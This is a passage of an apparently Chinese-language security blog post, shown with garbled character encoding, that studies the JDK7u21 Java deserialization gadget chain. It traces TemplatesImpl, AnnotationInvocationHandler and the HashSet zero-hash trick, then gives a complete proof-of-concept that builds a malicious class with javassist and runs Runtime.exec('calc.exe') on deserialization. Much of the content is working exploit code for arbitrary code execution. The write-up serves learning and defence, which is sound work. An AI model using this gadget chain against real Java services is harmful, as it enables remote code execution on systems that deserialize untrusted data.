alt="QQæˆªå›¾20220316141120"></p><h2 id="TemplatesImp"><a href="#TemplatesImp" class="headerlink" title="TemplatesImp"></a>TemplatesImp</h2><p>å› ä¸ºä¹‹å‰å­¦è¿‡äº†è¿™ä¸ªé“¾å­ï¼ˆå°±å¯ä»¥ç›´æ¥ä¸Šæ‰‹å¼¹ä¸€ä¸ªè®¡ç®—å™¨äº†ï¼‰ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> pool.get(Cat.class.getName());<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;<br>            <span class="hljs-comment">// åˆ›å»º static ä»£ç å—ï¼Œå¹¶æ’å…¥ä»£ç </span><br>            cc.makeClassInitializer().insertBefore(cmd);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">randomClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Evil&quot;</span>;<br>            cc.setName(randomClassName);<br><br>            cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br><br>            <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>            setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;cc.toBytecode()&#125;);<br>            setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;xsw6a&quot;</span>);<br>            setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>            templates.newTransformer();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¹¶ä¸”å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè™½ç„¶å¤§å¤šæ•°ç½‘ä¸Šçš„å†…å®¹éƒ½æœ‰å§è¿™ä¸¤ä¸ªä»£ç </p><p>ï¼ˆ <code>String randomClassName = &quot;Evil&quot;;``cc.setName(randomClassName);</code>ï¼‰åŠ å…¥è¿›å»ï¼Œä½†æ˜¯å®é™…ä¸ŠåŠ ä¸åŠ éƒ½æ˜¯æ— æ‰€è°“çš„ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161526267.png" alt="QQæˆªå›¾20220316152558"></p><p>ææ¸…æ¥šåˆ°è¿™é‡Œï¼Œå°±å¯ä»¥æ­£å¼å¼€å¯jdk7u21äº†ã€‚ä¸Šé¢å·²ç»èƒ½é€šè¿‡TemplatesImplè¿›è¡Œè°ˆè®¡ç®—å™¨äº†ï¼Œé‚£ä¹ˆç°åœ¨å°±è¦è€ƒè™‘å¦‚ä½•åœ¨ååºåˆ—åŒ–çš„æ—¶å€™è°ƒç”¨åˆ°<code>templates.newTransformer()</code></p><p>æˆ‘ä¸ªäººçš„ä¹ æƒ¯æ˜¯æ ¹æ®åˆ©ç”¨é“¾å­æ¥å­¦ä¹ ã€‚</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LinkedHashSet</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LinkedHashSet</span>.</span></span>add<span class="hljs-literal">()</span><span class="hljs-operator"></span><br><span class="hljs-operator">    ...</span><br><span class="hljs-operator">      </span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>hash<span class="hljs-constructor">Code()</span> (X)<br>  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LinkedHashSet</span>.</span></span>add<span class="hljs-literal">()</span><span class="hljs-operator"></span><br><span class="hljs-operator">    ...</span><br><span class="hljs-operator">      </span><span class="hljs-constructor">Proxy(Templates)</span>.hash<span class="hljs-constructor">Code()</span> (X)<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="hljs-literal">()</span> (X)<br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>hash<span class="hljs-constructor">CodeImpl()</span> (X)<br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">String</span>.</span></span>hash<span class="hljs-constructor">Code()</span> (<span class="hljs-number">0</span>)<br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>member<span class="hljs-constructor">ValueHashCode()</span> (X)<br>              <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>hash<span class="hljs-constructor">Code()</span> (X)<br>      <span class="hljs-constructor">Proxy(Templates)</span>.equals<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="hljs-literal">()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>equals<span class="hljs-constructor">Impl()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><span class="hljs-operator"></span><br><span class="hljs-operator">              ...</span><br><span class="hljs-operator">                 </span><span class="hljs-comment">// TemplatesImpl.getOutputProperties()ï¼Œå®é™…æµ‹è¯•æ—¶ä¼šç›´æ¥è°ƒç”¨ newTransformer()</span><br>                  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br>                      <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>define<span class="hljs-constructor">TransletClasses()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassLoader</span>.</span></span>define<span class="hljs-constructor">Class()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><span class="hljs-operator"></span><br><span class="hljs-operator">                          ...</span><br><span class="hljs-operator">                            </span>MaliciousClass.&lt;clinit&gt;<span class="hljs-literal">()</span><span class="hljs-operator"></span><br><span class="hljs-operator">                              ...</span><br><span class="hljs-operator">                                </span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h2 id="AnnotationInvocationHandler-equalsImplï¼ˆï¼‰"><a href="#AnnotationInvocationHandler-equalsImplï¼ˆï¼‰" class="headerlink" title="AnnotationInvocationHandler#equalsImplï¼ˆï¼‰"></a>AnnotationInvocationHandler#equalsImplï¼ˆï¼‰</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161642589.png" alt="QQæˆªå›¾20220316143147"></p><p>é€šè¿‡pç¥çš„è§£é‡Šï¼Œå¯ä»¥çŸ¥é“è¿™é‡Œæ˜¯ç»è¿‡éå†<strong>å¯æ§åˆ¶ç±»</strong>çš„æ‰€æœ‰æ–¹æ³•ã€‚é‚£ä¹ˆå°±å¯ä»¥å®ç°ä¸Šé¢æ‰€è¯´çš„è§¦å‘<code>templates.newTransformer()</code>ã€‚</p><h2 id="AnnotationInvocationHandler-invokeï¼ˆï¼‰"><a href="#AnnotationInvocationHandler-invokeï¼ˆï¼‰" class="headerlink" title="AnnotationInvocationHandler#invokeï¼ˆï¼‰"></a>AnnotationInvocationHandler#invokeï¼ˆï¼‰</h2><p>ç°åœ¨å°±è¦æƒ³åˆ°å¦‚ä½•è°ƒç”¨åˆ°<code>equalsImpl()</code>ã€‚<br>æˆ‘ä»¬æ¥åˆ°è¿™é‡Œã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161642244.png"></p><p>å¾ˆæ˜æ˜¾ï¼Œè¿™é‡Œåˆè¦è¿›å…¥åˆ°<code>AnnotationInvocationHandler#invoke()</code>ï¼Œä¸€ä¸ªåŠ¨æ€ä»£ç†å°±å¯ã€‚æ³¨æ„ä¸€ä¸‹ifçš„åˆ¤æ–­ã€‚</p><p><strong>å½“æ–¹æ³•åç­‰äºâ€œequalsâ€ï¼Œä¸”ä»…æœ‰ä¸€ä¸ªObjectç±»å‹å‚æ•°æ—¶ï¼Œä¼šè°ƒç”¨åˆ° equalsImpæ–¹æ³•ã€‚</strong></p><p>æ‰€ä»¥ç°åœ¨éœ€è¦æ‰¾åˆ°ä¸€ä¸ªæ–¹æ³•ï¼Œ<strong>åœ¨ååºåˆ—åŒ–æ—¶å¯¹proxyè°ƒç”¨equalsæ–¹æ³•</strong>ã€‚</p><h2 id="HashSet-readObjectï¼ˆï¼‰"><a href="#HashSet-readObjectï¼ˆï¼‰" class="headerlink" title="HashSet#readObjectï¼ˆï¼‰"></a>HashSet#readObjectï¼ˆï¼‰</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161447992.png" alt="QQæˆªå›¾20220316144700"></p><p>è¿™é‡Œè°ƒè¯•çš„æ—¶å€™åœ¨å›æ¥çœ‹ã€‚çœ‹äº†pç¥æ‰€è¯´çš„è¿™é‡Œå°±æ˜¯ï¼ˆè¿™é‡Œä½¿ç”¨äº†ä¸€ä¸ªHashMapï¼Œå°†å¯¹è±¡ä¿å­˜åœ¨HashMapçš„keyå¤„æ¥åšå»é‡ï¼‰</p><h2 id="HashMap-putï¼ˆï¼‰"><a href="#HashMap-putï¼ˆï¼‰" class="headerlink" title="HashMap#putï¼ˆï¼‰"></a>HashMap#putï¼ˆï¼‰</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161450394.png" alt="QQæˆªå›¾20220316145015"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œè°ƒç”¨äº†key.equals(k)ï¼Œä¸¤ä¸ªä¸åŒçš„å¯¹è±¡çš„ i ç›¸ç­‰æ—¶ï¼Œæ‰ä¼šæ‰§è¡Œåˆ° key.equals(k)ã€‚ï¼ˆ<strong>ifè¯­å¥åˆ¤æ–­å…ˆåé¡ºåº</strong>ï¼‰</p><p>å¦‚ä½•è®©è®©proxyå¯¹è±¡çš„â€œå“ˆå¸Œâ€ï¼Œç­‰äºTemplateImplå¯¹è±¡çš„â€œå“ˆå¸Œâ€ã€‚ä¸ºä»€ä¹ˆæ˜¯å“ˆå¸Œï¼Ÿ<strong>int hash &#x3D; hash(key);</strong><br>**int i &#x3D; indexFor(hash, table.length)**ã€‚</p><h2 id="HashMap-hashï¼ˆï¼‰"><a href="#HashMap-hashï¼ˆï¼‰" class="headerlink" title="HashMap#hashï¼ˆï¼‰"></a>HashMap#hashï¼ˆï¼‰</h2><p>è·Ÿè¿›ä¸€ä¸‹hashã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161642090.png" alt="QQæˆªå›¾20220316145900"></p><p>å¯ä»¥æ³¨æ„åˆ°è¿™é‡Œåˆ¤æ–­å…¶å“ˆå¸Œå€¼æ˜¯å¦ç›¸ç­‰å–å†³äºï¼Œ<strong>k.hashCode()<strong>ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥è‡ªç„¶è€Œç„¶è¦å»çœ‹ä¸€ä¸‹è¿™ä¸¤ä¸ªç±»çš„hashCodeã€‚ä½†æ˜¯æˆ‘å¹¶æ²¡æœ‰æ‰¾åˆ°è¿™ä¸¤ä¸ªç±»çš„</strong>hashCode</strong>ã€‚è¿™é‡Œå¯ä»¥çœ‹ä¸€ä¸‹pç¥æ€ä¹ˆè§£é‡Šçš„ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161508532.png" alt="QQæˆªå›¾20220316150844"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HashDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">long</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">9999999999L</span>; i++) &#123;<br>                <span class="hljs-keyword">if</span> (Long.toHexString(i).hashCode() == <span class="hljs-number">0</span>) &#123;<br>                    System.out.println(Long.toHexString(i));<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è·‘å‡ºæ¥æ˜¯<code>f5a5a608</code>ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161515437.png" alt="QQæˆªå›¾20220316151531"></p><p>è¿™æ ·å…¶å®ä¸€ä¸ªå®Œæ•´çš„åˆ©ç”¨é“¾å°±å‡ºæ¥äº†ã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>é¦–å…ˆæ˜¯åˆ©ç”¨<strong>javassist</strong>ç”Ÿæˆæ¶æ„ç±»ã€‚</p><p>ä¸ºäº†è°ƒç”¨<strong>transfrom()</strong>,å¯»æ‰¾åˆ°AnnotationInvocationHandlerçš„<strong>equalsImpl()</strong></p><p>ä¸ºäº†è°ƒç”¨<strong>equalsImpl()<strong>å¯»æ‰¾åˆ°äº†AnnotationInvocationHandlerçš„</strong>invoke()</strong></p><p>å¦‚ä½•è§¦å‘<strong>invoke()</strong>(é‡‡ç”¨åŠ¨æ€ä»£ç†)ï¼Œä¸ºäº†æ»¡è¶³ifæ¡ä»¶ï¼ˆæ‰¾åˆ°**HashMap#put()**ï¼‰</p><p>ä¸ºäº†è§¦å‘ key.equals(k)ï¼Œæ‰¾åˆ°proxyå¯¹è±¡ä¸TemplateImplå¯¹è±¡çš„â€œå“ˆå¸Œâ€ç›¸ç­‰</p><h2 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h2><h3 id="æˆªå›¾pç¥çš„ç†è§£"><a href="#æˆªå›¾pç¥çš„ç†è§£" class="headerlink" title="æˆªå›¾pç¥çš„ç†è§£"></a>æˆªå›¾pç¥çš„ç†è§£</h3><p>åœ¨ç»è¿‡æˆ‘è°ƒè¯•ä¹‹åæˆ‘å‘ç°ã€‚å¼€å§‹æ²¡æœ‰æ³¨æ„åˆ°è¿™é‡Œæœ‰ä¸¤ä¸ª<strong>hashCodeImpl()<strong>ã€‚ä¹Ÿå°±æ˜¯pç¥æ‰€è¯´ï¼Œå¯ä»¥æ§åˆ¶proxyçš„hashcodeï¼Œé‚£ä¹ˆä»»ç„¶ä¼šè¿›å…¥</strong>hashCodeImpl</strong>ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161603435.png" alt="QQæˆªå›¾20220316160253"></p><p>åœ¨æ²¡æœ‰è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™å°±ä¼šæ¥åˆ°ç¬¬äºŒä¸ª**hashCodeImpl()**ã€‚è·Ÿè¿›å»çœ‹ä¸€ä¸‹ã€‚ï¼ˆè¿™é‡Œä¹Ÿå°±è·Ÿpç¥çš„æ€è·¯è¿æ¥äº†èµ·æ¥ã€‚ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161604410.png" alt="QQæˆªå›¾20220316160416"></p><p>è¿™é‡Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨æˆ‘ä»¬ç»è¿‡<strong>map.put</strong>å€¼ä¹‹åï¼Œæˆ‘ä»¬å°±ä¼šè¿›å…¥</p><p>ç„¶åç»è¿‡ä¸€äº›è·Ÿå…¥ä¸è¿›å»çš„è°ƒè¯•ã€‚æ¥åˆ°ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161643678.png" alt="QQæˆªå›¾20220316160723"></p><p>ç»§ç»­è°ƒè¯•ï¼Œä¼šæ¥åˆ°ï¼Œååºåˆ—åŒ–çš„å…¥å£ç‚¹ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161611242.png" alt="QQæˆªå›¾20220316161146"></p><p>è¿™é‡Œ<strong>instanceof ä¸¥æ ¼æ¥è¯´æ˜¯Javaä¸­çš„ä¸€ä¸ªåŒç›®è¿ç®—ç¬¦ï¼Œç”¨æ¥æµ‹è¯•ä¸€ä¸ªå¯¹è±¡æ˜¯å¦ä¸ºä¸€ä¸ªç±»çš„å®ä¾‹</strong>ã€‚æ‰€ä»¥æˆ‘ä»¬ä¼šæ„é€ <strong>HashSet set &#x3D; new LinkedHashSet();</strong></p><p>æ„Ÿè§‰å¥½åƒæ²¡æœ‰ä»€ä¹ˆç”¨ã€‚ï¼ˆå¾…ä¼šè¯•è¯•ï¼‰ã€‚å› ä¸ºæ²¡æœ‰ä¿®æ”¹hashå€¼ï¼Œè¿™é‡Œä¸ä¼šè§¦å‘<strong>key.equals(k)</strong></p><h3 id="Hashå€¼"><a href="#Hashå€¼" class="headerlink" title="Hashå€¼"></a>Hashå€¼</h3><p>æ¥ç€å°±åˆä¼šè¿›å…¥ä¹‹å‰çš„hashåˆ¤æ–­ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203161643460.png" alt="QQæˆªå›¾20220316163244"></p><p>è¿™é‡Œå°±å°†å…¶ä¿®æ”¹æˆä¸proxy.hashCodeä¸TemplatesImpl.hashCodeè”ç³»åˆ°äº†ä¸€èµ·ã€‚<br>å½“å…¶ç›¸ç­‰çš„æ—¶å€™å°±è§¦å‘äº†euqalæ–¹æ³•ã€‚ç„¶åå°±æˆåŠŸè¿æˆæ•´ä¸ªé“¾å­äº†ã€‚</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.LinkedHashSet;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Jdk7u21Demo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">cc</span> <span class="hljs-operator">=</span> pool.get(Cat.class.getName());<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;<br>        cc.makeClassInitializer().insertBefore(cmd);<br>        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;cc.toBytecode()&#125;);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">zeroHashCodeStr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;f5a5a608&quot;</span>;<br><br>        <span class="hljs-comment">// å®ä¾‹åŒ–ä¸€ä¸ªmapï¼Œå¹¶æ·»åŠ Magic Numberä¸ºkeyï¼Œä¹Ÿå°±æ˜¯f5a5a608ï¼Œvalueå…ˆéšä¾¿è®¾ç½®ä¸€ä¸ªå€¼</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(zeroHashCodeStr, <span class="hljs-string">&quot;foo&quot;</span>);<br><br>        <span class="hljs-comment">// å®ä¾‹åŒ–AnnotationInvocationHandlerç±»</span><br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">handlerConstructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);<br>        handlerConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">tempHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) handlerConstructor.newInstance(Templates.class, map);<br><br>        <span class="hljs-comment">// ä¸ºtempHandleråˆ›é€ ä¸€å±‚ä»£ç†</span><br>        <span class="hljs-type">Templates</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (Templates) Proxy.newProxyInstance(Jdk7u21Demo.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, tempHandler);<br><br>        <span class="hljs-comment">// å®ä¾‹åŒ–HashSetï¼Œå¹¶å°†ä¸¤ä¸ªå¯¹è±¡æ”¾è¿›å»</span><br>        <span class="hljs-type">HashSet</span> <span class="hljs-variable">set</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashSet</span>();<br>        set.add(templates);<br>        set.add(proxy);<br><br>        <span class="hljs-comment">// å°†æ¶æ„templatesè®¾ç½®åˆ°mapä¸­</span><br>        map.put(zeroHashCodeStr, templates);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(set);<br>        oos.close();<br><br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span 